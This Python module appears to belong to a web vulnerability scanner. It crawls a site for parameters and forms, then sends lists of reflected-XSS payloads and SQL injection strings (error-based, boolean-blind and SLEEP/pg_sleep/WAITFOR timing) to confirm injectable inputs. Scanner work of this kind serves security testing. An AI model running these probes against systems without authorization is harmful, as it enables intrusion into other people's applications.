"""Built-in light crawler + reflected-XSS probe + SQLi heuristics.

These give broad "大量嘗試" SQLi & XSS coverage even without sqlmap/dalfox, and
produce the param-URL / form inventory that sqlmap and dalfox then attack in
depth. Every probe is a non-destructive oracle:

  * XSS  — inject a unique benign marker with a context break-out, then check the
           break-out is reflected VERBATIM (metacharacters un-encoded). Nothing is
           executed; we only look for our own marker string in the response.
  * SQLi — error-signature differential, boolean 1=1/1=2 response differential
           (SELECT-only), and SLEEP/pg_sleep/WAITFOR timing. All read-only.
"""
from __future__ import annotations

import re
import time
import uuid
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl, urldefrag

from .config import Config
from . import webhttp

_HREF_RE = re.compile(r"""(?:href|src|action)\s*=\s*["']([^"'#>]+)""", re.I)
_FORM_RE = re.compile(r"<form\b[^>]*>(.*?)</form>", re.I | re.S)
_ACTION_RE = re.compile(r"""action\s*=\s*["']([^"']*)""", re.I)
_METHOD_RE = re.compile(r"""method\s*=\s*["']([^"']*)""", re.I)
_INPUT_RE = re.compile(r"""<(?:input|textarea|select)\b[^>]*\bname\s*=\s*["']([^"']+)""", re.I)

# SQL error fingerprints (DB-agnostic)
SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
    "supplied argument is not a valid mysql", "unclosed quotation mark after the character string",
    "quoted string not properly terminated", "microsoft ole db provider for sql server",
    "odbc sql server driver", "sqlstate", "pg_query()", "postgresql query failed",
    "syntax error at or near", "sqlite3::", "sqlite error", "ora-01756", "ora-00933",
    "ora-00921", "you have an error in your", "native client",
    # extra breadth
    "warning: pg_", "psql:", "fatal: ", "mysqli_", "pdoexception", "sql syntax",
    "conversion failed when converting", "incorrect syntax near", "mysqlnd",
    "valid postgresql result", "org.postgresql.util.psqlexception", "com.mysql.jdbc",
    "sqlite_", "unterminated quoted string", "division by zero", "ora-00936",
]

_HTTP_MAX = 200_000


def crawl(bases: list[str], cfg: Config) -> tuple[list[str], list[dict]]:
    """BFS the same host to depth ~1-2, collecting param URLs and forms."""
    seen: set[str] = set()
    param_urls: dict[str, str] = {}      # normalized-key -> url
    forms: list[dict] = []
    queue = list(bases)
    host_of = {urlparse(b).netloc for b in bases}
    pages = 0
    while queue and pages < cfg.crawl_max_pages:
        url = queue.pop(0)
        url, _ = urldefrag(url)
        if url in seen:
            continue
        seen.add(url)
        if urlparse(url).netloc not in host_of:
            continue
        st, hdrs, body = webhttp.get(url, cfg.http_timeout, cfg.user_agent, max_bytes=_HTTP_MAX)
        if st == 0 or "html" not in (hdrs.get("Content-Type", "") + hdrs.get("content-type", "")).lower():
            continue
        pages += 1
        # param urls from links
        for m in _HREF_RE.finditer(body):
            link = urljoin(url, m.group(1).strip())
            if urlparse(link).netloc not in host_of:
                continue
            if urlparse(link).query:
                key = _param_key(link)
                param_urls.setdefault(key, link)
            if link not in seen and len(seen) + len(queue) < cfg.crawl_max_pages * 3:
                queue.append(link)
        # forms
        for fm in _FORM_RE.finditer(body):
            block = fm.group(0)
            am = _ACTION_RE.search(block)
            action = urljoin(url, am.group(1)) if am and am.group(1) else url
            if urlparse(action).netloc not in host_of:
                continue
            method = (_METHOD_RE.search(block).group(1).upper()
                      if _METHOD_RE.search(block) else "GET")
            inputs = list(dict.fromkeys(_INPUT_RE.findall(block)))
            if inputs:
                forms.append({"action": action, "method": method, "inputs": inputs})
        # also treat the base itself if it had params
        if urlparse(url).query:
            param_urls.setdefault(_param_key(url), url)
    return list(param_urls.values()), _dedupe_forms(forms)


def _param_key(url: str) -> str:
    u = urlparse(url)
    names = sorted(k for k, _ in parse_qsl(u.query))
    return f"{u.scheme}://{u.netloc}{u.path}?{','.join(names)}"


def _dedupe_forms(forms: list[dict]) -> list[dict]:
    out, seen = [], set()
    for f in forms:
        key = (f["action"], f["method"], tuple(f["inputs"]))
        if key not in seen:
            seen.add(key)
            out.append(f)
    return out


# --------------------------------------------------------------------------- #
# reflected XSS — many payloads across many injection contexts ("大量嘗試")
# --------------------------------------------------------------------------- #
def _xss_marker() -> str:
    return "edurx" + uuid.uuid4().hex[:6]


def _xss_payloads(m: str) -> list[tuple[str, str, str]]:
    """(context_label, payload, detect). If `detect` is reflected verbatim, the
    metacharacters survived un-encoded in that context -> executable injection."""
    dq, sq, bt = '"', "'", "`"
    P = [
        ("html-tag",      m + "<svg/onload=1>"),
        ("html-img",      m + dq + "><img src=x onerror=1>"),
        ("html-anchor",   dq + "><b>" + m + "z</b>"),
        ("script-break",  m + "</script><svg/onload=1>"),
        ("style-break",   m + "</style><svg/onload=1>"),
        ("title-break",   m + "</title><svg/onload=1>"),
        ("textarea-break",m + "</textarea><svg/onload=1>"),
        ("comment-break", m + "--><svg/onload=1>"),
        ("attr-dq",       m + dq + " autofocus onfocus=1 x=" + dq),
        ("attr-sq",       m + sq + " autofocus onfocus=1 x=" + sq),
        ("js-str-dq",     m + dq + ";1//"),
        ("js-str-sq",     m + sq + ";1//"),
        ("js-template",   m + bt + ";1//"),
        ("body-onload",   m + "<body onload=1>"),
        ("details",       m + "<details open ontoggle=1>"),
        ("marquee",       m + "<marquee onstart=1>"),
        ("iframe-js",     m + "<iframe src=javascript:1>"),
        ("svg-script",    m + "<svg><script>1</script>"),
        ("img-lower",     m + "<img src=x onerror=1>"),
    ]
    return [(label, payload, payload) for label, payload in P]


def _inside_tag(body: str, marker: str) -> bool:
    """marker sits inside an element's start-tag (nearest '<' is unclosed)."""
    i = body.find(marker)
    if i < 0:
        return False
    pre = body[:i]
    return pre.rfind("<") > pre.rfind(">")


def _inside_script(body: str, marker: str) -> bool:
    """marker sits inside a <script>...</script> block."""
    i = body.find(marker)
    if i < 0:
        return False
    pre = body[:i].lower()
    return pre.rfind("<script") > pre.rfind("</script")


def _xss_confirm(body: str, marker: str, label: str, payload: str) -> bool:
    """Executable-reflection oracle. A raw <tag> break-out is XSS in any context;
    a bare quote/backtick break-out only matters in the context it targets, so it
    must land inside a tag (attribute) or a <script> block — else it's not FP-free."""
    if payload not in body:                 # break-out not reflected verbatim (encoded/stripped)
        return False
    if "<" in payload and ">" in payload:   # our own <tag ...> reflected un-encoded
        return True
    if label in ("attr-dq", "attr-sq"):
        return _inside_tag(body, marker)
    if label in ("js-str-dq", "js-str-sq", "js-template"):
        return _inside_script(body, marker)
    return False


def probe_xss(param_urls: list[str], forms: list[dict], cfg: Config) -> list[dict]:
    findings: list[dict] = []
    budget = [getattr(cfg, "xss_payload_budget", 400)]      # mutable request counter
    nmax = getattr(cfg, "xss_max_params", cfg.crawl_max_targets)
    used = 0
    for url in param_urls[:cfg.crawl_max_targets]:
        if budget[0] <= 0 or used >= nmax:
            break
        for hit in _xss_on_url(url, cfg, budget):
            findings.append(hit)
        used += 1
    for form in forms[:cfg.crawl_max_targets]:
        if budget[0] <= 0 or used >= nmax:
            break
        for hit in _xss_on_form(form, cfg, budget):
            findings.append(hit)
        used += 1
    return findings


def _xss_on_url(url: str, cfg: Config, budget: list) -> list[dict]:
    u = urlparse(url)
    params = parse_qsl(u.query, keep_blank_values=True)
    stop_first = getattr(cfg, "xss_stop_on_first_ctx", True)
    out = []
    for i, (name, _v) in enumerate(params):
        if budget[0] <= 0:
            break
        marker = _xss_marker()
        best = None
        reflected = False
        last_test = url
        for label, payload, detect in _xss_payloads(marker):
            if budget[0] <= 0:
                break
            budget[0] -= 1
            newq = params.copy()
            newq[i] = (name, payload)
            test = f"{u.scheme}://{u.netloc}{u.path}?{urlencode(newq)}"
            last_test = test
            _st, _h, body = webhttp.get(test, cfg.http_timeout, cfg.user_agent, max_bytes=_HTTP_MAX)
            if marker in body:
                reflected = True
            if _xss_confirm(body, marker, label, payload):
                best = {"url": test, "method": "GET", "param": name, "context": label,
                        "payload": payload, "severity": "high"}
                if stop_first:
                    break
        if best:
            out.append(best)
        elif reflected:
            out.append({"url": last_test, "method": "GET", "param": name,
                        "context": "reflected-encoded", "payload": "", "severity": "low"})
    return out


def _xss_on_form(form: dict, cfg: Config, budget: list) -> list[dict]:
    stop_first = getattr(cfg, "xss_stop_on_first_ctx", True)
    out = []
    for name in form["inputs"]:
        if budget[0] <= 0:
            break
        marker = _xss_marker()
        best = None
        reflected = False
        last_test = form["action"]
        for label, payload, detect in _xss_payloads(marker):
            if budget[0] <= 0:
                break
            budget[0] -= 1
            data = {inp: (payload if inp == name else "1") for inp in form["inputs"]}
            if form["method"] == "POST":
                _st, _h, body = webhttp.request(form["action"], method="POST", data=data,
                                                timeout=cfg.http_timeout, ua=cfg.user_agent,
                                                max_bytes=_HTTP_MAX)
                test = form["action"]
            else:
                test = f"{form['action']}?{urlencode(data)}"
                _st, _h, body = webhttp.get(test, cfg.http_timeout, cfg.user_agent, max_bytes=_HTTP_MAX)
            last_test = test
            if marker in body:
                reflected = True
            if _xss_confirm(body, marker, label, payload):
                best = {"url": test, "method": form["method"], "param": name,
                        "context": label, "payload": payload, "severity": "high"}
                if stop_first:
                    break
        if best:
            out.append(best)
        elif reflected:
            out.append({"url": last_test, "method": form["method"], "param": name,
                        "context": "reflected-encoded", "payload": "", "severity": "low"})
    return out


# --------------------------------------------------------------------------- #
# SQLi — error-based + boolean-blind + time-blind ("大量嘗試")
# --------------------------------------------------------------------------- #
ERR_INJECT = ["'", '"', "')", "';", '"))', "`", "'\"", "\\", " OR '1'='1'-- -", "-1"]
BOOL_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    (" AND 1=1", " AND 1=2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
]
TIME_PAYLOADS = [
    "' AND SLEEP({d})-- -",
    " AND SLEEP({d})",
    "') AND SLEEP({d})-- -",
    '" AND SLEEP({d})-- -',
    "';SELECT pg_sleep({d})-- -",
    "' OR pg_sleep({d})-- -",
    "';WAITFOR DELAY '0:0:{d}'-- -",
    "'||(SELECT SLEEP({d}))||'",
]


def _new_errors(baseline: str, injected: str) -> list[str]:
    bl, inj = baseline.lower(), injected.lower()
    return [sig for sig in SQL_ERRORS if sig in inj and sig not in bl]


def _bool_oracle(base: str, t: str, f: str) -> bool:
    """True response ~= baseline while False clearly differs from both."""
    lb, lt, lf = len(base), len(t), len(f)
    if max(lb, lt, lf) == 0:
        return False
    same_tb = abs(lt - lb) <= max(24, 0.03 * max(lt, lb))
    diff_tf = abs(lt - lf) >= max(48, 0.05 * max(lt, lf))
    diff_fb = abs(lf - lb) >= max(48, 0.05 * max(lf, lb))
    return same_tb and diff_tf and diff_fb


def probe_sqli(param_urls: list[str], forms: list[dict], cfg: Config) -> list[dict]:
    out: list[dict] = []
    tbudget = [getattr(cfg, "sqli_time_budget", 8)]
    nmax = getattr(cfg, "sqli_max_params", cfg.crawl_max_targets)
    used = 0
    for url in param_urls[:cfg.crawl_max_targets]:
        if used >= nmax:
            break
        out.extend(_sqli_on_url(url, cfg, tbudget))
        used += 1
    for form in forms[:cfg.crawl_max_targets]:
        if used >= nmax:
            break
        out.extend(_sqli_on_form(form, cfg, tbudget))
        used += 1
    return out


def probe_sql_errors(param_urls: list[str], forms: list[dict], cfg: Config) -> list[dict]:
    """Back-compat: error-based hits only (older callers)."""
    return [h for h in probe_sqli(param_urls, forms, cfg) if h.get("technique") == "error-based"]


def _sqli_probe(fetch, cfg: Config, tbudget: list, name: str, method: str) -> dict | None:
    """fetch(payload, timeout) -> (elapsed, body, test_url). Try error, then
    boolean, then (bounded) time-based. Return the first confirmed technique."""
    _el, base, _t = fetch("", cfg.http_timeout)

    if getattr(cfg, "sqli_error_based", True):
        for inj in ERR_INJECT:
            _el, body, test = fetch(inj, cfg.http_timeout)
            errs = _new_errors(base, body)
            if errs:
                return {"url": test, "method": method, "param": name,
                        "technique": "error-based", "payload": inj,
                        "errors": errs[:3], "evidence": {"sql_errors": errs[:3]}}

    if getattr(cfg, "sqli_boolean_blind", True):
        for tp, fp in BOOL_PAIRS:
            _el, tbody, ttest = fetch(tp, cfg.http_timeout)
            _el, fbody, _ft = fetch(fp, cfg.http_timeout)
            if _bool_oracle(base, tbody, fbody):
                return {"url": ttest, "method": method, "param": name,
                        "technique": "boolean-blind", "payload": tp + "  /  " + fp,
                        "evidence": {"len_base": len(base), "len_true": len(tbody),
                                     "len_false": len(fbody)}}

    if getattr(cfg, "sqli_time_blind", True) and tbudget[0] > 0:
        d = getattr(cfg, "sqli_time_delay", 5)
        to = d + 6
        base_el, _b, _t = fetch("", to)
        for tmpl in TIME_PAYLOADS:
            if tbudget[0] <= 0:
                break
            pay = tmpl.format(d=d)
            tbudget[0] -= 1
            el, _body, test = fetch(pay, to)
            if el >= d * 0.8 and base_el < d * 0.5:
                # re-confirm to kill one-off network jitter
                el2, _b2, _t2 = fetch(pay, to)
                tbudget[0] -= 1
                if el2 >= d * 0.8:
                    return {"url": test, "method": method, "param": name,
                            "technique": "time-based", "payload": pay,
                            "evidence": {"delay_s": d, "elapsed_s": round(el, 2),
                                         "elapsed2_s": round(el2, 2),
                                         "baseline_s": round(base_el, 2)}}
    return None


def _sqli_on_url(url: str, cfg: Config, tbudget: list) -> list[dict]:
    u = urlparse(url)
    params = parse_qsl(u.query, keep_blank_values=True)
    out = []
    for i, (name, val) in enumerate(params):
        def fetch(pay, to, _i=i, _val=val, _name=name):
            newq = params.copy()
            newq[_i] = (_name, (_val or "1") + pay)
            test = f"{u.scheme}://{u.netloc}{u.path}?{urlencode(newq)}"
            t0 = time.monotonic()
            _st, _h, body = webhttp.get(test, to, cfg.user_agent, max_bytes=_HTTP_MAX)
            return time.monotonic() - t0, body, test
        hit = _sqli_probe(fetch, cfg, tbudget, name, "GET")
        if hit:
            out.append(hit)
    return out


def _sqli_on_form(form: dict, cfg: Config, tbudget: list) -> list[dict]:
    out = []
    for name in form["inputs"]:
        def fetch(pay, to, _name=name):
            data = {inp: (("1" + pay) if inp == _name else "1") for inp in form["inputs"]}
            if form["method"] == "POST":
                t0 = time.monotonic()
                _st, _h, body = webhttp.request(form["action"], method="POST", data=data,
                                                timeout=to, ua=cfg.user_agent, max_bytes=_HTTP_MAX)
                return time.monotonic() - t0, body, form["action"]
            test = f"{form['action']}?{urlencode(data)}"
            t0 = time.monotonic()
            _st, _h, body = webhttp.get(test, to, cfg.user_agent, max_bytes=_HTTP_MAX)
            return time.monotonic() - t0, body, test
        hit = _sqli_probe(fetch, cfg, tbudget, name, form["method"])
        if hit:
            out.append(hit)
    return out
